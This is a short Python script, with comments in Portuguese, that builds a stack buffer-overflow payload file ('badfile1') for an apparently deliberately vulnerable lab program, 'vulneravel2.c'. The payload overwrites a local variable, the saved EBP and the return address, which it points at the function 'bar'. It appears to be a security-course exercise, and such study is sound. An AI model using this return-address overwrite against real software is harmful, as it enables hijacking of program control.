#!/usr/bin/python3

# inicializa o array (atencao: x00 encerra a string)
N = 25 # determina o tamanho do array (ALTERE pra um valor conveniente)
content = bytearray(0x90 for i in range(N))

# armazena uma string de 4 bytes a partir do offset 0 do array:
content[0:4] = ("SegD").encode('latin-1')

# armazena um inteiro de 4 bytes a partir do offset 4 do array:
# Este número irá ser colocado dentro da variável local c em func no vulneravel2.c
# como está em little indian e o começo se torna o 0x00 (\0), o strcpy para de copiar
# logo no começo do overflow, mas acaba por alterar o conteúdo de c mesmo assim.
# Para evitar este comportamento do strcpy, o conteúdo foi alterado.
number = 0xbababaca # 0xbabaca00
content[4:8] = (number).to_bytes(4, byteorder='little')

# Endereço da função bar em vulneravel2.c, obtido com `p &bar` no gdb.
BAR_ADDRESS = 0x8049e0d

# O endereço 16-19 corresponde ao $ebp.
# Aqui coloca-se um conteúdo qualquer somente para ilustração,
# mas não é necessário alterar já que o vetor está preenchido com 0x90.
content[16:20] = (0xedbedbed).to_bytes(4, byteorder='little')
# O endereço de `bar` precisa ser colocado em $ebp + 4.
content[20:24] = BAR_ADDRESS.to_bytes(4, byteorder='little')

# Coloca-se na última posição da string o terminador \0 para encerrar o strcpy.
content[24] = 0x00

# grava o array content no arquivo badfile1
with open('badfile1', 'wb') as f:
  f.write(content)
